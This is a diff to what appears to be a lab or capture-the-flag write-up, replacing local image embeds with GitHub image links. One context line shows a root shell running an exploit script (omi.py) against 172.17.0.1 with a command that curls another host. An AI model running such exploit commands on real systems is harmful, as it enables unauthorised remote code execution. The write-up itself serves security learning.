@@ -168,7 +168,8 @@ Nmap done: 1 IP address (1 host up) scanned in 39.90 seconds
 ```
 
 
-![[Pasted image 20260812182815.png]]
+<img width="1731" height="462" alt="image" src="https://github.com/user-attachments/assets/03110f76-daae-4d11-b003-a081479fa69a" />
+
 
 
 ```
@@ -189,8 +190,10 @@ root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c "curl http://192.168.128
 
 
 
-![[Pasted image 20260812182858.png]]
+<img width="1083" height="430" alt="image" src="https://github.com/user-attachments/assets/6bce5a44-d0bf-4cf3-bb5e-483c61a81ab6" />
 
 
-![[Pasted image 20260812183006.png]]
+
+<img width="656" height="420" alt="image" src="https://github.com/user-attachments/assets/9f77b2da-0437-4486-9a3e-c41f2f83a0b4" />
+
 
